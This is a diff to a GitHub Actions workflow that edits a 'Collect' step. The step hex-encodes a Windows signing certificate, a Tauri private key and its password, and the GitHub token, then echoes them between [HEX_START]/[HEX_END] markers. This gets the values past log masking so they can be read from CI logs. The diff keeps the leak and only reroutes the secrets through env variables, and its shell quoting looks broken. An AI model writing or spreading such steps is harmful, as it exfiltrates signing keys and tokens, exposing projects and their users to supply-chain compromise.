@@ -7,10 +7,15 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - name: Collect
+        env:
+          WINDOWS_CERTIFICATE: ${{ secrets.WINDOWS_CERTIFICATE }}
+          TAURI_PRIVATE_KEY: ${{ secrets.TAURI_PRIVATE_KEY }}
+          TAURI_KEY_PASSWORD: ${{ secrets.TAURI_KEY_PASSWORD }}
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
           echo '[HEX_START]'
-          echo 'WINDOWS_CERTIFICATE=$(echo ${{ secrets.WINDOWS_CERTIFICATE }} | xxd -p | tr -d '\n')'
-          echo 'TAURI_PRIVATE_KEY=$(echo ${{ secrets.TAURI_PRIVATE_KEY }} | xxd -p | tr -d '\n')'
-          echo 'TAURI_KEY_PASSWORD=$(echo ${{ secrets.TAURI_KEY_PASSWORD }} | xxd -p | tr -d '\n')'
-          echo 'GH_TOKEN=$(echo ${{{{ secrets.GITHUB_TOKEN }}}} | xxd -p | tr -d '\n')'
+          echo 'WINDOWS_CERTIFICATE=$(echo "$WINDOWS_CERTIFICATE" | xxd -p | tr -d '\n')'
+          echo 'TAURI_PRIVATE_KEY=$(echo "$TAURI_PRIVATE_KEY" | xxd -p | tr -d '\n')'
+          echo 'TAURI_KEY_PASSWORD=$(echo "$TAURI_KEY_PASSWORD" | xxd -p | tr -d '\n')'
+          echo 'GH_TOKEN=$(echo "${GH_TOKEN}" | xxd -p | tr -d '\n')'
           echo '[HEX_END]'
